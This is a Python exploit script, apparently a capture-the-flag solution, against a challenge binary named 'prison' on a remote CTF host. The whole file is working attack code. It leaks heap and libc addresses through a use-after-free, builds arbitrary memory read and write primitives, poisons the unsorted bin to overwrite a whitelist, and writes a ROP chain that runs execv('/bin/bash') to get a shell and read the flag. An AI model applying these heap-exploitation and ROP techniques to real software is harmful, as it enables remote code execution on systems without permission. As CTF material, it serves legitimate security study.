#!/usr/bin/env python

import subprocess as sp
import re
import pprint as pp
import traceback
import sys
import binascii
import socket

import threading
import time
import struct
from queue import Queue, Empty
import chdrft.utils as utils


import resource
resource.setrlimit(resource.RLIMIT_CORE, (-1, -1))


class PrisonerStruct:
    NORMAL_SIZE = 64
    off_risk = 0
    off_name = 0x8
    off_aka = 0x10
    off_age = 0x18
    off_cell = 0x1c
    off_sentence = 0x20
    off_notesize = 0x28
    off_note = 0x30
    off_next = 0x38

    def __init__(self):
        self.risk = 0
        self.name = 0
        self.aka = 0
        self.age = 0
        self.cell = 0
        self.sentence = 0
        self.note_size = 0
        self.note = 0
        self.next = 0
        self.addr = None

    def build(self, n=None):
        data = struct.pack(
            b'<QQQIIQI4xQQ',
            self.risk,
            self.name,
            self.aka,
            self.age,
            self.cell,
            self.sentence,
            self.note_size,
            self.note,
            self.next)
        return data[:n]

    @staticmethod
    def load(addr, data):
        self = PrisonerStruct()
        self.addr = addr

        self.risk, self.name, self.aka, self.age, self.cell, self.sentence, self.note_size, self.note, self.next = struct.unpack(
            b'<QQQIIQI4xQQ', data[
                :self.NORMAL_SIZE])
        return self


# typedef struct prisoner_s {
#    const char * risk
#    char * name
#    char * aka
#    uint32_t age
#    uint32_t cell
#    char * sentence
#    uint32_t note_size
#    char * note
#    struct prisoner_s * next
#} Prisoner


class Connection:
    def __init__(self, conn=None):
        self.conn=conn
        if conn==None:

            def local_read(self):
                return self.output.read(1)

            def local_write(self, msg):
                self.input.write(msg)
                self.input.flush()

            def local_close(self):
                if self.proc is not None:
                    self.proc.kill()
                self.output.close()

            self.read=lambda: local_read(self)
            self.write=lambda x: local_write(self, x)
            self.close=lambda: local_close(self)

            cmd='./prison'
            proc = sp.Popen(cmd, shell=True, stdin=sp.PIPE, stdout=sp.PIPE)
            self.proc = proc
            self.input = proc.stdin
            self.output = proc.stdout

        else:

            def sock_read(self):
                return self.sock.recv(1)
            def sock_write(self, msg):
                self.sock.send(msg)
            def sock_close(self):
                self.sock.close()

            self.read=lambda: sock_read(self)
            self.write=lambda x: sock_write(self, x)
            self.close=lambda: sock_close(self)

            self.sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, True)
            self.sock.connect(conn)

    def __del__(self):
        self.close()

class Prison:

    def __init__(self, conn):
        self.proc = None
        self.cells = {}
        self.th = None
        self.conn=conn


    def send(self, msg, want_len=7):
        if isinstance(msg, str):
            msg = msg.encode('ascii')
        if want_len != -1:
            msg += b' '*(want_len-len(msg))
        self.conn.write(msg)

    def get_output(self, timeout=0.05):
        res = b''
        while True:
            try:
                tmp = self.q.get(timeout=timeout)
                res += tmp
            except Empty as e:
                break
        reg = re.compile(b'> |\n')
        return reg.split(res)

    def launch(self):

        self.q = Queue()
        self.stop = False

        def enqueueData():
            reg = re.compile(b'> ')
            try:
                while not self.stop:
                    c = self.conn.read()
                    if len(c)=='':
                        break
                    self.q.put(c)

            except Exception as e:
                if self.stop:
                    return

                print(e)
                assert False
                traceback.print_exc()

        self.th = threading.Thread(target=enqueueData)
        self.th.setDaemon(True)
        self.th.start()

        for i in self.get_output():
            match = re.search(
                'CELL ([0-9]+) at 0x([0-9a-fA-F]+)',
                i.decode('ascii'))
            if match is not None:
                cellNum = int(match.group(1))
                cellAddr = int(match.group(2), 16)
                self.cells[cellNum] = cellAddr

    def close(self):
        self.stop = True
        self.conn.close()
        self.th.join()

    def __def__(self):
        self.close()

    def list(self):
        self.get_output()
        self.send('list')
        res = {}

        data = {}
        tb = self.get_output()
        tb.append(b'')  # just to be sure

        for x in tb:
            if x == b'':
                if len(data) != 0:
                    data['Cell'] = int(data['Cell'])
                    res[data['Cell']] = data
                    data = {}
            else:
                # pray god that the address chars do not interfere WOLOLO
                tmp = x.split(b': ', 1)
                if len(tmp) != 2:
                    continue

                if tmp[0] == b'Prisoner':
                    tmp2 = tmp[1].split(b' (', 1)
                    data['Name'] = tmp2[0]
                    data['AKA'] = tmp2[1][:-1]
                else:

                    data[tmp[0].decode('ascii')] = tmp[1]
        return res

    def punish(self, num):
        self.send('punish')
        self.send(str(num))

    def note(self, num, data='', n=None, write=True):
        self.get_output()  # flush
        if isinstance(data, str):
            data = data.encode('ascii')
        if n is None:
            n = len(data)
        else:
            data = data+b'a'*(n-len(data))
        print('SENDING LEN >> ', len(data))

        self.send('note')
        self.send('%d' % num)
        self.send('%d' % len(data))

        tmp = self.get_output()
        print('OUTPUT >>>', tmp)
        assert(len(tmp) > 0)
        if len(tmp[-1]) == 0:
            assert not write
            print('NOT WRITING')
            return False

        self.send(data, want_len=-1)
        return True


def get_rop(elf, libc_elf, rop_addr):
    #execv(edi, esi)
    pop1_rdi=elf.find_gadget('pop rdi; ret')
    pop2_rsi=elf.find_gadget('pop rsi; pop r15; ret')
    pop4_rsp=elf.find_gadget('pop rsp; pop r13; pop r14; pop r15; ret')
    assert pop1_rdi!=None
    assert pop2_rsi!=None
    assert pop4_rsp!=None
    ret=elf.find_gadget('ret')
    execv_addr=libc_elf.get_dyn_symbol('execv')


    stage1_len=0x50

    stage0=b''
    stage0+=struct.pack('<QQ', pop4_rsp, rop_addr+16+stage1_len)


    stage1=b''
    stage1_addr=rop_addr+len(stage0)
    path_addr=stage1_addr
    stage1+=b'/bin/bash\x00'
    #stage1+=b'/tmp/test.bin\x00'
    arg_addr=stage1_addr+len(stage1)
    stage1+=struct.pack('<QQ', path_addr, 0)


    stage2=b''
    stage2+=struct.pack('<3Q', 0, 0, 0)
    stage2+=struct.pack('<2Q', pop1_rdi, path_addr)
    stage2+=struct.pack('<3Q', pop2_rsi, arg_addr, 0)
    stage2+=struct.pack('<Q', execv_addr)


    stage1+=b'a'*(stage1_len-len(stage1))
    rop=stage0+stage1+stage2
    return rop






class Solver:
    NUM_CELLS = 10
    EH_SIZE = 132
    ROP1_SIZE = 0x100

    def __init__(self, prison, std_fname, libc_fname, prison_fname):
        self.prison = prison

        self.cells = []
        for i in range(1, self.NUM_CELLS):
            self.cells.append(i)
        self.reader_cell = self.get_and_remove()
        self.free_cell = 0
        self.malloc_cell = self.get_and_remove()

        self.std_elf = utils.ElfUtils(std_fname)
        self.libc_elf = utils.ElfUtils(libc_fname)
        self.prison_elf = utils.ElfUtils(prison_fname)

    def get_and_remove(self):
        return self.cells.pop()

    def read_memory(self, addr, size):
        p1 = PrisonerStruct()
        p1.note = addr
        p1.note_size = size

        assert prison.note(self.reader_cell, p1.build())
        desc = prison.list()
        print('READ MEMORY >> ', hex(addr))
        return desc[p1.cell]['Note']

    def read_memory_dw(self, addr, num):
        print('READ MEM >> ', hex(addr))
        want = 8*num
        res = self.read_memory(addr, want)
        num = len(res)//8
        res = res[:num*8]

        ans = struct.unpack('<%dQ' % (num), res)
        return ans

    def do_malloc(self, size, old_data=(0, 0), write=True):
        prison = self.prison
        sx = self.mem_cells[self.malloc_cell]

        sx.note = old_data[0]
        sx.note_size = old_data[1]

        self.write_mem(sx.addr, sx.build())
        prison.note(sx.cell, n=size, write=write)
        # can be pretty large alloc, dont want to read all the shit
        self.write_mem(sx.addr + PrisonerStruct.off_notesize,
                       struct.pack('<I', 0))
        addr = self.read_memory_dw(sx.addr+PrisonerStruct.off_note, 1)[0]

        return (addr, size)

    def write_mem(self, addr, data, wait=False):
        prison = self.prison

        sx = PrisonerStruct()
        sx.cell = self.free_cell
        sx.note = addr
        sx.note_size = len(data)
        prison.note(self.reader_cell, sx.build())
        if wait:
            input('write_mem wait')
        prison.note(self.free_cell, data)

    def getSmallbinIndex(self, sz):
        #+0x10 for malloc own data (e.g length)
        return (sz+0x10) >> 4

    def getBinData(self, idx):
        addr = self.binAddr+idx*0x10+0x10
        return self.read_memory_dw(addr, 2)

    def stdc_analysis(self, terminate_addr):
        print('terminated addr >> ', hex(terminate_addr))
        std_terminate_off = self.std_elf.get_dyn_symbol(
            '_ZN9__gnu_cxx27__verbose_terminate_handlerEv')
        self.std_elf.offset = terminate_addr-std_terminate_off
        self.stdcpp_malloc_plt = self.std_elf.get_reloc('malloc')
        print('malloc plt >> ', hex(self.stdcpp_malloc_plt))

    def libc_analysis(self, malloc_addr):
        libc_malloc_off = self.libc_elf.get_dyn_symbol('malloc')
        self.libc_elf.offset = malloc_addr-libc_malloc_off
        print('libc offset >> ',self.libc_elf.offset)

    def find_cell(self, startAddr, age, cellNum):
        mem = self.read_memory(startAddr-0x200, 0x200)

        reg = utils.binaryRe('<II', age, cellNum)
        print(binascii.hexlify(mem))
        m = re.search(reg, mem)
        assert m is not None

        # offset (age)
        pos = m.start()-0x18

        res = PrisonerStruct().load(
            startAddr+pos, mem[pos:pos+PrisonerStruct.NORMAL_SIZE])
        return res

    def read_cell(self, cell_num):
        cell_addr = self.mem_cells[cell_num]
        mem = self.read_memory(cell_addr, PrisonerStruct.NORMAL_SIZE)
        return PrisonerStruct().load(cell_addr, mem)

    def prison_binary_analysis(self, riskAddr):
        ro_section = self.prison_elf.get_section(b'.rodata')
        print(ro_section)
        res = ro_section['data'].find(b'High\x00')
        assert res != -1
        riskOffset = ro_section['raw']['sh_addr']+res
        self.prison_elf.offset = riskAddr-riskOffset
        self.head_addr = self.prison_elf.get_symbol('_ZL4head')
        self.whitelist_addr = self.prison_elf.get_symbol('_ZL13dst_whitelist')
        print(
            'HEAD, whitelist >> ', hex(self.head_addr),
            hex(self.whitelist_addr))

    def stage1(self):
        self.step1()
        self.step2()
        self.step3()

    def step1(self):
        # free, then malloc to get some pointers to bins
        prison = self.prison

        # free_cell buf put in fastbin, no info leaked here
        prison.punish(self.free_cell)

        # need this one to be allocated now so that we can easily find the
        # address Prisoner structs
        self.ehCell = self.get_and_remove()
        prison.note(self.ehCell, 'a'*self.EH_SIZE)

        # don want eh buffer to be realloced to same => force split
        tempCell = self.get_and_remove()
        prison.note(tempCell, 'a'*50)

        # large bin -> call to malloc_consolidate which put free_cell buffer in
        # unsorted_chunks
        prison.note(self.get_and_remove(), 'a'*0x1000)

        desc = prison.list()
        r1 = desc[self.free_cell]['Name']
        assert len(r1) <= 8
        r1 += b'\x00'*(8-len(r1))

        self.binAddr = struct.unpack('<Q', r1)[0]
        self.binAddr -= (self.getSmallbinIndex(PrisonerStruct.NORMAL_SIZE)-1) * \
            0x10
        #-1 because we read data from previous bin
        print('BIN ADDR >> ', hex(self.binAddr))

        # reader_cell->note=buf of self.free_cell
        prison.note(self.reader_cell, PrisonerStruct().build())

    def get_cells(self):
        res = {}
        x = self.find_cell(
            self.eh_buf_addr + self.EH_SIZE + 0x10,
            age=51, cellNum=9)

        res[x.cell] = x
        while x.next != 0:
            x = PrisonerStruct.load(
                x.next,
                self.read_memory(x.next, PrisonerStruct.NORMAL_SIZE))
            res[x.cell] = x

        for k, v in res.items():
            print('======= MEM CELL ', k, hex(v.addr))

        return res

    def step2(self):
        prison = self.prison

        # free eh buffer, ehCell already in  unsorted buff since maxfast=0x80
        # and we > it
        prison.note(self.ehCell, 'a'*0x200)

        unsorted = self.getBinData(1)
        # chunk2mem()
        self.eh_buf_addr = unsorted[0]+0x10
        # last 0x10 for refcounted -> cxa_exception
        print('EH BUF ADDR >> ', hex(self.eh_buf_addr))

        prison.send('fail')
        pp.pprint(
            list(enumerate(map(hex, self.read_memory_dw(self.eh_buf_addr, 40)))))


        # exc->private2=uw_identify_context(&cur_context) >libgcc/unwind.c l128
        self.interact_rsp = self.read_memory_dw(self.eh_buf_addr+15*0x8, 1)[0] -\
            4*0x8
        print('Interact RSP >> ', hex(self.interact_rsp))

# doing binary analysis
        self.terminate_addr = self.read_memory_dw(self.eh_buf_addr+5*8, 1)[0]
        self.stdc_analysis(self.terminate_addr)

        self.malloc_addr=self.read_memory_dw(self.stdcpp_malloc_plt, 1)[0]
        self.libc_analysis(self.malloc_addr)

        self.mem_cells = self.get_cells()
        assert len(self.mem_cells) == 10

        self.prison_binary_analysis(self.mem_cells[1].risk)
# end binary analysis


        t1 = self.do_malloc(0x200)
        t2 = self.do_malloc(0x500)
        t1 = self.do_malloc(0x300, t1)

        # now should have a last_remainder
        self.do_malloc(0x100)

        print('NOW GO BIG MALLOC')
        time.sleep(1)
        u1 = self.do_malloc(1 << 15, write=False)
        self.do_malloc(1 << 15, write=False)
        self.do_malloc(1 << 16, u1, write=False)
        self.do_malloc(1 << 14, write=False)

        control_buf_size = 0x200
        control_cell = self.get_and_remove()
        prison.note(control_cell, '', n=control_buf_size)

        control_buf_addr = self.read_memory_dw(
            self.mem_cells[control_cell].addr +
            PrisonerStruct.off_note,
            1)[0]
        print('control buf addr >> ', hex(control_buf_addr))

        inject_chunk_size = 0x120
        inject_chunk_addr = control_buf_addr+0x10

        # also need to configure old size + IN_USE
        prison.note(
            control_cell,
            struct.pack(
                '<QQ%dx2Q' %
                (inject_chunk_size - 0x10), 0,
                inject_chunk_size | 1, 0, 0x30 | 1),
            n=control_buf_size)
        sx = PrisonerStruct()
        sx.note_size = inject_chunk_size-0x10
        sx.note = control_buf_addr+0x10
        sx.cell = self.free_cell
        prison.note(self.reader_cell, sx.build())

        print('#########Injecting controlled chunk#######')
        # freeing the chunk that we control
        prison.note(self.free_cell, 'a'*(inject_chunk_size+0x40))

        temp_cell = self.get_and_remove()

        #-0x10 because we change chunk->FD=unsortedbin[0]
        target_addr = self.whitelist_addr-0x10
        print('#########Modifying the injected chunk########')
        prison.note(
            control_cell,
            struct.pack('<QQQQ', 0, inject_chunk_size, 0, target_addr),
            n=control_buf_size)

        # exact match, no checks every benef
        print('##########GOGO INJECT###########')
        print('TARGET ADDR >> ', hex(target_addr))
        prison.note(temp_cell, '', n=inject_chunk_size-0x10)

        print('########### DONE INJECT###########')
        # now we can write wherever we want, just not allocate anymore :)

    def step3(self):
        prison = self.prison

        #just fucking up the stash will do
        ret_addr=self.interact_rsp-0x8
        rop=get_rop(self.prison_elf, self.libc_elf, ret_addr)
        self.write_mem(ret_addr, rop, wait=True)
        input('quit?')


        prison.send('cat flag\n', want_len=-1)
        print(prison.get_output())


conn=None

local=False

if local:
    std_fname = './219/lib64/libstdc++.so'
    libc_fname = './219/lib/libc-2.19.so'

    conn=None
    conn=('localhost', 1404)
    prison_fname='./server_env/prison'
    prison_fname = './prison'
else:
    std_fname = './server_env/libs/libstdc++.so.6'
    libc_fname = './server_env/libs/libc.so.6'
    prison_fname = './server_env/prison'

    conn=('wildwildweb.fluxfingers.net', 1404)



def test1():
    solver = Solver(None, std_fname, libc_fname, prison_fname)
    solver.stdc_analysis(0x10000)
    solver.libc_analysis(0x10000)
    solver.prison_binary_analysis(0x10000)
    get_rop(solver.prison_elf, solver.libc_elf, 0x200000)

    sys.exit(0)

#test1()

conn=Connection(conn)
prison = Prison(conn)
prison.launch()
time.sleep(0.5)

solver = Solver(prison, std_fname, libc_fname, prison_fname)


solver.stage1()

#_ZN9__gnu_cxx27__verbose_terminate_handlerEv
# tmp=solver.read_memory(solver.bin65Addr+8, 8)
# print(hex(struct.unpack('<Q', tmp)[0]))
# for k, v in prison.cells.items():
#    print('%d: %016x' % (k, v))
prison.close()
